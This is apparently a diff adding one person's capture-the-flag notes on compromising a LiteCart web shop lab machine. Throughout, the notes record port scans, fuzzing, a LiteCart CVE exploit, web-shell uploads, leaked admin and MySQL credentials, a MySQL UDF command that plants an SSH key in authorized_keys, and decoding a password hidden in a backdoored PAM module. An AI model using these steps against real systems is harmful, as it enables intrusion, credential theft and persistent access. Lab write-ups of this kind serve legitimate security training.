@@ -1,0 +1,121 @@
+10.129.13.7
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-12 22:44 EDT
+Nmap scan report for 10.129.12.154
+Host is up (0.12s latency).
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 6e:da:5c:8e:8e:fb:8e:75:27:4a:b9:2a:59:cd:4b:cb (RSA)
+|   256 d5:c5:b3:0d:c8:b6:69:e4:fb:13:a3:81:4a:15:16:d2 (ECDSA)
+|_  256 35:6a:ee:af:dc:f8:5e:67:0d:bb:f3:ab:18:64:47:90 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Legitimate Rubber Ducks | Online Store
+|_Requested resource was http://10.129.12.154/shop/en/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 311.19 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+
+http://10.129.12.154/backup/
+a.zip.tar
+site uses litecart
+http://10.129.12.154/shop/admin/login.php?redirect_url=%2Fshop%2Fadmin%2F
+http://10.129.12.154/shop/robots.txt
+  Disallow: */cache/*
+  Sitemap: /feeds/sitemap.xml
+
+http://10.129.12.154/backup/cache/FUZZ
+http://10.129.12.154/shop/cache/FUZZ
+
+X - CVE-2020-9018
+  https://www.youtube.com/watch?v=SxAOTSB_VZw
+    edit customer profile with command
+    admin opens and exports to CSV
+    command execution
+    windows (?) so wont ork
+
+
+X - ffuf -u http://10.129.12.154/shop/vqmod/FUZZ -w ~/wordlists/raft-large-words.txt
+a.tar.gz
+chinese
+slovak
+hungarian
+czech
+
+O - http://10.129.13.7/shop/admin/logs
+  LiteCart 2.1.2
+  CVE-2018-12256
+    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12256
+    https://www.exploit-db.com/exploits/45267
+
+O - lucky guess... wtf... curl http://10.129.13.7/backup/a.tar.gz -o trash.tar
+^ instead of downloading as tar.gz... just curl and make tar then unzip
+  can just mv a.tar.gz to a.tar and unzip? NOPE have to curl
+
+O - untar and check shop/admin/login.php
+  comment says: //file_put_contents("./.log2301c9430d8593ae.txt"
+    http://10.129.13.7/shop/admin/.log2301c9430d8593ae.txt
+    User: admin Passwd: theNextGenSt0r3!~
+    admin:theNextGenSt0r3!~
+    O - limited RCE... why? check php info
+    X - python 45267.py -u admin -t http://10.129.13.7/shop/admin/ -p 'theNextGenSt0r3!~' 
+    O - use burp and just insert code into the body
+        X - https://github.com/mxrch/webwrap
+        O - https://github.com/epinna/weevely3
+
+X - user weevelys README for good recon and get:
+  mysql db root password is changethis.... 
+  root@localhost:None SQL> select user,authentication_string from mysql.user
+   
+  +------------------+-------------------------------------------+
+  | user             | authentication_string                     |
+  +------------------+-------------------------------------------+
+  | root             | *C890DD6B4A77DC26B05EB1EE1E458A3E374D3E5B |
+  | mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+  | mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+  | debian-sys-maint | *7CDDF050D9C0BC9EB6FDFE3C9CBC1E5F852A9F7A |
+  +------------------+-------------------------------------------+
+
+PHP version           | 7.2.24-0ubuntu0.18.04.6  
+  https://packetstormsecurity.com/files/154728/PHP-7.3-disable_functions-Bypass.html
+  https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php
+  O - https://github.com/mxrch/webwrap
+    http://10.129.13.66/shop/vqmod/xml/kun0.php?c=WRAP
+
+5.7.30-0ubuntu0.18.04.1
+X - show function status \G
+O - select * from mysql.func
+  mysql --host=localhost --user=root --password=changethis -e "select exec_cmd('whoami');"
+mysql --host=localhost --user=root --password=changethis -e "select exec_cmd('echo \'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0jV9cCFl4i2T1fDfu9L1svAN0qLPvXDAC9FBpnXTPkXNmKzGVGhtv8zl9Vl8inlhpDuza+AM1KcTws2Iyf7lcJeQxITQaCmbjxM310rasKqBBNTwUEGDm++hj4mTIZ3c2ChXIM3OfCwkmTzNX/COeb2MaGjabw6Sb5aWm4sQqLz+bjvPWwp5b0+vJgKFYtwRTUP9H3WFKPkhLgUO/Zyg+Uh7Hy2brLWCxaIZ3HK9Gz3jH3hExplbqFpx3ODOJpbIN/hnXzxe19GIKAeM664SkyNLSF2GLSkYSp1bcSVh51OghnYb+gXW7AmmiOwc1BqphF71S092x0MeNiJ2eDikxGOLvgVigUd16XSJVcD/MbxWJR56XYPxNP3BP8UjkzmiL3ZWe5r4auvkOD29IO0xfFjDC2lVPPgWK1N3/zcjVPauV6igb5qUfFNrSMhTg9Rj7sJFjTEqdya8Fmp8E4+pYthzpmlv6ghPEMkXn+hjBMyic+lR9K0aH2iZQR2+2lsk= kali@kali\' > /var/lib/mysql/.ssh/authorized_keys');"
+
+cat strace-log.dat
+search for sysadmin
+sysadmin hasa line saying: [sudo] password for sysadmin
+sysadmin password 3*NLJE32I$Fe
+su as sysadmin with this password
+
+################################################################################
+ROOT
+################################################################################
+back to that strate-log.dat, there is also a line:
+write(2, "mysql -u root --password='3*NLJE"..., 39) = 39
+so roots password for mysql is also this?
+
+see whats changed:
+dpkg -V 2>/dev/null
+suss: /lib/x86_64-linux-gnu/security/pam_unix.so
+objdump -D will reveal fishy hex
+this hex
+  45 33 55 7e 65 6b 6c 7a : 0x19(rsp)
+  2d 32 6d 32 38 76 6e    : 0x21(rsp)
+
+assume stored little endian,
+then read from low bits to high
+so this becomes:
+  7a 6c 6b 65 7e 55 33 45 6e 76 38 32 6d 32 2d
